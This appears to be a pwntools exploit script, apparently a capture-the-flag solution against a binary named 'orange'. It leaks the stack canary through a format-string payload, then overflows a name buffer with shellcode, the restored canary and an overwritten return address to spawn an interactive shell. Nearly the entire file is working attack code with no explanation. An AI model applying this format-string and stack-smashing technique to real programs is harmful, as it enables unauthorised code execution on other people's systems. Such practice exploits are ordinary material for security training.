from pwn import *

#context.log_level = 'debug'

elf = context.binary = ELF("./orange")
libc = elf.libc

gs = '''
bp main
continue
'''
def start():
    global gs
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.0.0.0", 5001)
    else:
        return process(elf.path)


def change_name(name:bytes):
    io.sendline("5")
    io.recvuntil(b'Enter your name:')
    io.sendline(name)

def buy_orange(count:int):
    io.sendline("3")
    io.recvuntil(b'Enter the number of oranges you want to buy:')
    io.sendline(str(count).encode())
    

def show_card():
    io.sendline("1")
    res = io.recvline()
    return res

def initial_name():
    io.recvuntil(b"name:")
    payload = f'%{17}$p'
    io.sendline(payload)

def exit_prog():
    io.sendline("6")

# comment: Find canary offset by fmt string
# for i in range(0, 50):
#     io = start()

#     initial_name() 

#     io.recvuntil(b'choice:')
#     buy_orange(1)
#     io.recvuntil(b'choice:')
#     print(f'{i} - ', end='')
#     show_card()
    
#     sleep(1)

# Leak canary
io = start()
initial_name()
io.recvuntil(b'choice:')
buy_orange(1)
io.recvuntil(b'choice:')
canary = show_card().decode()
canary = int(canary.replace("Buyer: ","").replace("\n",""), 16)

print(f"Canary: {hex(canary)}")

shellcode = asm(shellcraft.amd64.linux.sh())

# Overwrite RIP
payload = shellcode 
payload+= b'A' * (104 - len(payload))
payload+= p64(canary)
payload+= b'B' * 8
payload+= p64(0x0000000000401225)

change_name(payload)

io.interactive()